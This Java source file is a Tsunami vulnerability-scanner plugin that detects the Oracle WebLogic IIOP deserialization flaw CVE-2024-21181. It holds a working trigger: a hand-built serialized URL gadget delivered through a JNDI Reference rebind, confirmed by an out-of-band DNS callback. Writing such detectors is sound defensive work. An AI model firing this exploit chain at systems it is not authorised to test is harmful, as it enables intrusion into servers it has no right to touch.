/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.cves.cve202421181;

import static com.google.common.base.Preconditions.checkNotNull;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.net.HostAndPort;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkEndpointUtils;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.net.URI;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import java.util.Hashtable;
import javax.inject.Inject;
import javax.management.MBeanServer;
import javax.naming.BinaryRefAddr;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.RefAddr;
import javax.naming.Reference;
import javax.naming.StringRefAddr;

/** A Tsunami plugin that detects the WebLogic T3/IIOP Deserialization Bug (CVE-2024-21181) */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "WebLogic Unsafe Deserialization (CVE-2024-21181)",
    version = "0.1",
    author = "Leonardo Giovannini (leonardo@doyensec.com), Savino Sisco (savio@doyensec.com)",
    description =
        "This plugin detects the T3/IIOP Unsafe Deserialization vulnerability in Oracle WebLogic.",
    bootstrapModule = WeblogicUnsafeDeserializationBootstrapModule.class)
public final class WeblogicUnsafeDeserialization implements VulnDetector {
  @VisibleForTesting static final String VULNERABILITY_REPORT_PUBLISHER = "TSUNAMI_COMMUNITY";
  @VisibleForTesting static final String VULNERABILITY_REPORT_ID = "CVE-2024-21181";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_TITLE =
      "Oracle WebLogic T3/IIOP Unsafe Deserialization (CVE-2024-21181)";

  static final String VULNERABILITY_REPORT_DESCRIPTION_BASIC =
      "The scanner detected an Oracle WebLogic instance vulnerable to T3/IIOP Unsafe"
          + " Deserialization (CVE-2024-21181). The vulnerability can be exploited by sending an"
          + " unauthenticated T3/IIOP request with a carefully crafted gadget chain that executes"
          + " malicious code\n";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_DESCRIPTION_CALLBACK =
      VULNERABILITY_REPORT_DESCRIPTION_BASIC
          + "The vulnerability was confirmed via an out of band DNS callback.";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_RECOMMENDATION = "Install the latest security patches";

  @VisibleForTesting static final String FINGERPRINT_ENDPOINT = "/console";

  @VisibleForTesting
  static final String FINGERPRINT_HTML_12 =
      "<title>Oracle WebLogic Server Administration Console</title>";

  @VisibleForTesting
  static final String FINGERPRINT_HTML_14 =
      "<span id=\"product-brand-name\">WebLogic Server</span>";

  static final String WEBLOGIC_CONTEXT_FACTORY_CLASS = "weblogic.jndi.WLInitialContextFactory";

  static final String WEBLOGIC_SERIALIZER_CLASS =
      "weblogic.management.mbeanservers.partition.PartitionedDomainRuntimeMbsRefObjFactory";

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;

  @Inject
  WeblogicUnsafeDeserialization(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  private String ensureCorrectCallbackUrlFormat(String domainOrUrl) {
    if (domainOrUrl.startsWith("http://") || domainOrUrl.startsWith("https://")) {
      return domainOrUrl;
    } else {
      return "http://" + domainOrUrl;
    }
  }

  // This is the main entry point of VulnDetector.
  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("WebLogic T3 Unsafe Deserialization starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isWeblogic)
                .filter(this::isOracleClientLibLoaded)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(ImmutableList.toImmutableList()))
        .build();
  }

  private boolean isOracleClientLibLoaded(NetworkService networkService) {
    try {
      Class.forName(WEBLOGIC_CONTEXT_FACTORY_CLASS);
    } catch (ClassNotFoundException e) {
      logger.atWarning().log(
          "The detector was compiled without the necessary WebLogic client library, therefore it is"
              + " not possible to continue with the detection. See the README on how to compile it"
              + " correctly.");
      return false;
    }
    return true;
  }

  /*
   Tries to get the Oracle WebLogic version by parsing the console page.
  */
  private boolean isWeblogic(NetworkService networkService) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + FINGERPRINT_ENDPOINT;

    HttpRequest req = HttpRequest.get(targetUri).withEmptyHeaders().build();

    HttpResponse response;
    try {
      response = this.httpClient.send(req, networkService);
    } catch (IOException e) {
      return false;
    }

    return response.bodyString().orElse("").contains(FINGERPRINT_HTML_12)
        || response.bodyString().orElse("").contains(FINGERPRINT_HTML_14);
  }

  public static byte[] hexStringToByteArray(String s) {
    int len = s.length();
    byte[] data = new byte[len / 2];
    for (int i = 0; i < len; i += 2) {
      data[i / 2] =
          (byte) ((Character.digit(s.charAt(i), 16) << 4) + Character.digit(s.charAt(i + 1), 16));
    }
    return data;
  }

  private static byte[] getPayload(String url) throws Exception {
    URI uri = new URI(url);
    String domain = uri.getHost();

    byte[] start =
        hexStringToByteArray(
            "ACED0005737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C770800000010000000017372000C6A6176612E6E65742E55524C962537361AFCE47203000749000868617368436F6465490004706F72744C0009617574686F726974797400124C6A6176612F6C616E672F537472696E673B4C000466696C6571007E00034C0004686F737471007E00034C000870726F746F636F6C71007E00034C000372656671007E00037870FFFFFFFFFFFFFFFF74");
    byte[] middle = hexStringToByteArray("74000071007E000574000468747470707874");
    byte[] end = hexStringToByteArray("78");

    int buff_size =
        (start.length + middle.length + end.length)
            + // Static parts
            domain.length()
            + 2
            + // Domain + String size
            url.length()
            + 2; // URL + String size

    ByteBuffer buff = ByteBuffer.allocate(buff_size);
    // Initial part
    buff.put(start);

    // Domain
    buff.putShort((short) domain.length());
    buff.put(domain.getBytes(StandardCharsets.UTF_8));

    // Middle part
    buff.put(middle);

    // URL
    buff.putShort((short) url.length());
    buff.put(url.getBytes(StandardCharsets.UTF_8));

    // Ending byte
    buff.put(end);

    buff.limit(buff.position());
    return buff.array();
  }

  private Reference createReference(byte[] payload) {
    StringRefAddr addr = new StringRefAddr("partitionName", "test");
    Reference reference =
        new Reference(MBeanServer.class.getName(), addr, WEBLOGIC_SERIALIZER_CLASS, null);
    RefAddr jvmIdAddr = new BinaryRefAddr("jvmId", payload);
    reference.add(jvmIdAddr);
    return reference;
  }

  private boolean isServiceVulnerable(NetworkService networkService) {

    // Generate the payload for the callback server
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.SSRF)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.INTERPRETATION_ANY)
            .setExecutionEnvironment(PayloadGeneratorConfig.ExecutionEnvironment.EXEC_ANY)
            .build();

    String oobCallbackUrl;
    Payload payload = this.payloadGenerator.generate(config);

    if (payload == null || !payload.getPayloadAttributes().getUsesCallbackServer()) {
      logger.atWarning().log(
          "Tsunami Callback Server not available. This detector needs it to detect the"
              + " vulnerability.");
      return false;
    }

    oobCallbackUrl = ensureCorrectCallbackUrlFormat(payload.getPayload());

    HostAndPort targetPage =
        NetworkEndpointUtils.toHostAndPort(networkService.getNetworkEndpoint());
    /*
    Note: for some weird reason, when using the T3 protocol instead of IIOP, the exploit seems to
    work but the callback actually comes from the client.
     */
    String rhost = String.format("iiop://%s:%s", targetPage.getHost(), targetPage.getPort());

    Hashtable<String, String> env = new Hashtable<String, String>();
    env.put("java.naming.factory.initial", WEBLOGIC_CONTEXT_FACTORY_CLASS);
    env.put(Context.PROVIDER_URL, rhost);

    // Create InitialContext
    logger.atInfo().log("Creating InitialContext");
    Context context;
    try {
      context = new InitialContext(env);
    } catch (NamingException e) {
      logger.atSevere().withCause(e).log("Could not create InitalContext");
      return false;
    }

    // Build the payload
    byte[] gadget;
    logger.atInfo().log("Building the serialized payload");
    try {
      gadget = getPayload(oobCallbackUrl);
    } catch (Exception e) {
      logger.atSevere().withCause(e).log("Failed to build the serialized payload.");
      return false;
    }

    // Create and rebind reference
    String name = String.valueOf(System.currentTimeMillis());
    logger.atInfo().log("Creating Reference to payload");
    Reference reference = this.createReference(gadget);
    try {
      logger.atInfo().log("Rebinding reference");
      context.rebind(name, reference);
    } catch (NamingException e) {
      logger.atSevere().withCause(e).log("Could not rebind reference.");
      return false;
    }

    logger.atInfo().log("Performing lookup");
    try {
      context.lookup(name);
    } catch (NamingException e) {
      // Do nothing. An exception here is expected and the exploit may have worked.
    }

    // Wait for callback
    Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(5));

    if (payload.checkIfExecuted()) {
      logger.atInfo().log("Vulnerability confirmed via Callback Server.");
      return true;
    } else {
      logger.atInfo().log("No callback received.");
      return false;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher(VULNERABILITY_REPORT_PUBLISHER)
                        .setValue(VULNERABILITY_REPORT_ID))
                .setSeverity(Severity.CRITICAL)
                .setTitle(VULNERABILITY_REPORT_TITLE)
                .setDescription(VULNERABILITY_REPORT_DESCRIPTION_CALLBACK)
                .setRecommendation(VULNERABILITY_REPORT_RECOMMENDATION))
        .build();
  }
}
